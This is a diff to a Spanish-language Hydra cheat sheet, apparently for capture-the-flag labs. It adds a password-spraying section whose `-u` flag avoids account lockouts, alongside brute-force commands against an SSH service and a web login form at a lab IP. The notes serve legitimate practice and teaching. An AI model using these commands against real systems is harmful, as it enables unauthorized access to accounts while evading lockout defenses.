@@ -28,6 +28,14 @@ El éxito con Hydra depende estrictamente de no confundir mayúsculas y minúscu
 *(Requiere la ruta, los campos inyectando `^USER^` y `^PASS^`, y el mensaje de fallo exacto).*
 `hydra -l admin -P rockyou.txt 10.10.10.X http-post-form "/login.php:user=^USER^&pass=^PASS^:Fallo el inicio de sesion"`
 
+**4. Ataque Sigiloso (Password Spraying / Alternar Usuarios):** *Si tienes una lista de usuarios y una lista de contraseñas, por defecto Hydra prueba todas las contraseñas en el primer usuario (lo que causa bloqueos de cuenta). Para evitarlo, usamos la bandera `-u` (minúscula) que invierte el bucle: prueba 1 contraseña en todos los usuarios, y luego pasa a la siguiente.* 
+* **Comando:** `hydra -L usuarios.txt -P rockyou.txt ssh://10.10.10.X -u -t 4` 
+* **Cómo funciona:** 
+	Intento 1: user1 : password_A 
+	Intento 2: user2 : password_A 
+	Intento 3: user1 : password_B 
+	Intento 4: user2 : password_B
+
 ### Optimización para CTFs (Prevención de Errores)
 Si atacas muy rápido, los servicios de red modernos (especialmente SSH) se protegerán y rechazarán tus conexiones, arrojando falsos negativos.
 *   `-t 4`: Tareas Paralelas (Hilos). Para SSH, **nunca uses más de 4 hilos**.
